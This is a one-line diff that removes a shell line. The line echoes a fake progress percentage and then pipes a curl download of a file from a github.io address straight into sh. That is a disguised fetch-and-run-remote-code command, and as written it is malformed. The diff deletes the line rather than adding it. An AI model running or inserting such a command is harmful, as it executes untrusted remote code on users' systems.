@@ -1,1 +1,0 @@
-echo Progress: 89.00%curl -L --progress-bar frkns.github.io/fun/resulting-newark-antivirus-trials-rn-postage-party.gzip | sh
